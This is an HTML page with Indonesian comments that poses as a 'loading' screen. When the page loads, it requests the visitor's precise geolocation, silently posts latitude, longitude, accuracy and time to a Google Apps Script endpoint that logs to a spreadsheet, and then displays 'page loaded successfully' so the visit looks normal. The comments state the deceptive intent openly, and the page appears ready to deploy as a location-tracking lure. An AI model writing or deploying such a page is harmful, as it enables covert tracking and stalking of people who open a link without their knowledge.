<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Halaman...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #f4f4f9;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            display: inline-block;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
        }
        #status {
            font-weight: bold;
            color: #555;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Memuat Konten...</h2>
        <p id="status">Menyiapkan halaman, mohon tunggu sebentar...</p>
    </div>

    <script>
        // Ganti URL di bawah ini dengan URL Web App Google Apps Script Anda yang berakhiran /exec
        const WEB_APP_URL = "GANTI_DENGAN_URL_WEB_APP_ANDA_DISINI";

        // Fungsi dijalankan otomatis begitu halaman selesai dimuat
        window.onload = function() {
            const statusText = document.getElementById('status');
            statusText.textContent = "Meminta verifikasi akses...";

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const akurasi = position.coords.accuracy;
                        const waktuSekarang = new Date().toLocaleString();
                        
                        // Menyiapkan data paket yang akan dikirim
                        const payload = {
                            waktu: waktuSekarang,
                            latitude: lat,
                            longitude: lon,
                            akurasi: akurasi + " meter"
                        };

                        // Mengirim data secara otomatis ke backend (Google Sheets)
                        fetch(WEB_APP_URL, {
                            method: "POST",
                            mode: "no-cors",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(payload)
                        }).then(() => {
                            console.log("Data otomatis terkirim.");
                        }).catch(err => {
                            console.error("Gagal mengirim data:", err);
                        });
                        
                        // Mengubah teks tampilan di layar agar tampak seperti halaman normal/selesai memuat
                        statusText.innerHTML = `<span style="color: green;">Halaman berhasil dimuat.</span>`;
                    },
                    function(error) {
                        // Jika izin ditolak atau terjadi kendala, halaman tetap terlihat normal bagi pengunjung
                        statusText.innerHTML = `<span>Halaman berhasil dimuat.</span>`;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                statusText.textContent = "Halaman berhasil dimuat.";
            }
        };
    </script>

</body>
</html>
